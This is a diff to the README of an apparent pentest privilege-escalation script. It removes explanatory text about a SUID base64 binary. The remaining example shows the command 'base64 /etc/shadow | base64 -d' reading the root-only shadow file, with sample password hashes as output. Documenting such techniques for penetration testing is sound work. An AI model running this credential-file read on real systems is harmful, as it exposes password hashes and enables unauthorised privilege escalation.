@@ -62,10 +62,6 @@ This is the recommended method for use during a pentest, as seen in the demo vid
 
 ## 💡 Example: SUID Exploit
 
-In the demo video, the script identifies `/usr/bin/base64` as having the SUID bit set.
-
-Because the binary runs as `root`, it can be used to read sensitive files, such as `/etc/shadow`, which is normally only readable by root.
-
 ```bash
 $ ./privesc.sh
 
@@ -86,7 +82,7 @@ $ ./privesc.sh
 $ base64 /etc/shadow | base64 -d
 ubuntu:$y$j9T$vTJesvSYgTtcVv//OGDCPytz0b$HVjAkS46CYIilgc..:19999:7:::
 daemon:*:19193:0:99999:7:::
-...
+[...]
 test:$y$j9T$vTJesvSYgTtcVv//OGDCPytz0b$HVjAkS46CYIilgc..:19999:7:::
 ```
 
